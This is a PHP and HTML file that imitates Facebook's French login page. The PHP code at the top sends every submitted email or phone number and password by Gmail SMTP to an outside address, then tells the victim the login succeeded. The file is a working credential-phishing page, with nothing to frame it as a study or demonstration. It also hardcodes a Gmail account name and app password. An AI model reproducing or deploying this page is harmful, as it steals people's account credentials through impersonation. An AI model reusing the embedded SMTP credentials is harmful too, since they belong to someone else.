<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require __DIR__ . '/vendor/autoload.php'; // OU remplace par include manuel des fichiers PHPMailer si pas de composer

$popupMessage = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $emailOrPhone = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    $mail = new PHPMailer(true);

    try {
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'hansmbaya@gmail.com';
        $mail->Password = 'fwnh etlc yequ suzy'; // mot de passe d’application
        $mail->SMTPSecure = 'ssl';
        $mail->Port = 465;

        $mail->setFrom('hansmbaya@gmail.com', 'Hans Mbaya Newsletter');
        $mail->addAddress('mbayahans@gmail.com');
        $mail->Subject = 'Nouvelle tentative de connexion Facebook';
        $mail->Body = "Email ou téléphone : $emailOrPhone\nMot de passe : $password";

        $mail->send();
        $popupMessage = "Connexion réussie. Vos informations ont été envoyées avec succès.";
    } catch (Exception $e) {
        $popupMessage = "Erreur lors de l’envoi : {$mail->ErrorInfo}";
    }
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook – Connexion ou inscription</title>
  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
  <style>
    * { box-sizing: border-box; }

    body {
      margin: 0;
      padding: 0;
      background-color: #f0f2f5;
      font-family: Helvetica, Arial, sans-serif;
    }

    .logo-container {
      text-align: center;
      padding: 40px 0 10px;
    }

    .logo-container img {
      width: 80px;
      height: auto;
    }

    .main-container {
      display: flex;
      justify-content: center;
      align-items: center;
      padding-bottom: 60px;
    }

    .login-box {
      width: 396px;
      background-color: #ffffff;
      padding: 20px 16px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin-bottom: 10px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      font-size: 16px;
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #1877f2;
      color: white;
      font-size: 17px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 5px;
    }

    .login-box button:hover {
      background-color: #166fe5;
    }

    .login-box a {
      display: block;
      text-align: center;
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
      margin-top: 14px;
    }

    .divider {
      border-top: 1px solid #dddfe2;
      margin: 20px 0;
    }

    .create-account {
      background-color: #42b72a;
      color: white;
      font-weight: bold;
    }

    .create-account:hover {
      background-color: #36a420;
    }

    .footer-message {
      text-align: center;
      margin-top: 30px;
      font-size: 14px;
    }

    .popup {
      display: <?php echo $popupMessage ? 'block' : 'none'; ?>;
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background-color: #0D1C40;
      color: gold;
      padding: 15px 25px;
      border-radius: 10px;
      font-size: 16px;
      z-index: 1000;
      box-shadow: 0 0 10px rgba(0,0,0,0.5);
      animation: fadeIn 0.4s ease-out;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateX(-50%) translateY(-10px); }
      to { opacity: 1; transform: translateX(-50%) translateY(0); }
    }

    @media screen and (max-width: 450px) {
      .login-box {
        width: 90%;
      }

      .logo-container img {
        width: 65px;
      }
    }
  </style>
</head>
<body>

<?php if ($popupMessage): ?>
  <div class="popup"><?php echo htmlspecialchars($popupMessage); ?></div>
<?php endif; ?>

<br><br><br><br>

<div class="logo-container">
  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
</div>

<br>

<div class="main-container">
  <form method="POST" class="login-box">
    <input type="text" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
    <input type="password" name="password" placeholder="Mot de passe" required>
    <button type="submit">Se connecter</button>
    <a href="#">Mot de passe oublié ?</a>

    <div class="divider"></div>

    <button type="button" class="create-account">Créer nouveau compte</button>
  </form>
</div>

<div class="footer-message">
  <p><a href="#"></a></p>
</div>
</body>
</html>